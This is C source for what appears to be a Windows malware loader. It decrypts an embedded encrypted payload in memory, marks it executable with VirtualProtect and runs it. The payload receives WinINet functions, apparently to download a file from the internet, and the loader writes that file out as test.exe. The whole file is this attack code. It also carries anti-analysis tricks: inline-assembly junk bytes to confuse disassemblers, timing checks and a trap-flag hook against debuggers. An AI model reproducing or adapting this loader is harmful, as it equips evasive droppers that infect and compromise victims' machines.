#include "loader.h"
#include "payload_enc.c"
extern void setTrapFlag(void);

#define TOMFOOLERY asm volatile(\
        "call appendByte2Rip\n\t"\
        ".byte 0x9a\n\t"\
    );

#define RECORD_TIME asm volatile(\
        "call pushTime\n\t"\
        ".byte 0x9a\n\t"\
);

#define CHECK_TIME asm volatile(\
        "call loadTime\n\t"\
        ".byte 0x9a\n\t"\
);


void DBGLG(char buf[], ...){
    #ifdef DEBUG
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}

/*
    args = {
        InternetOpen,
        InternetOpenUrlA,
        InternetReadFile,
        InternetCloseHandle,
        unsigned char* buf,
        int* sz
    }
*/
typedef unsigned int (*payload)(unsigned long long*);
unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL};
int main(){
    TOMFOOLERY
    RECORD_TIME
    unsigned char MasterKey[16];
    for (int i = 0; i< 16; ++i){
        MasterKey[i] = i*16 + i;
    }
    int sz = 0;

    unsigned char KeyList[176];
    PDWORD junk = malloc(sizeof(PDWORD));
    unsigned char execute_me[sizeof(payload_enc_bytes)];
    // unsigned char* buf = malloc(60 * 1024 * sizeof(unsigned char));
    unsigned char buf[200 * 1024];
    args[4] = buf;
    args[5] = &sz;
    HANDLE hFile = CreateFile("./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening file. Error code: %d\n", GetLastError());
        return 1;
    }


    // printf("%d\n",payload_ex(args));

    printf("Len is %d\n", sz);
    payload p;
    memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
    KeyScheduler(MasterKey, KeyList);
    for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
        Decrypt(execute_me + i, KeyList);
    }
    CHECK_TIME
    VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
    p = (payload)(execute_me);
    CHECK_TIME
    p(args);

    DWORD bytesWritten;
    BOOL result = WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);

    if (!result) {
        fprintf(stderr, "Error writing to file. Error code: %d\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    DBGLG("Exit?\n");
    // payload();
    return 0;
}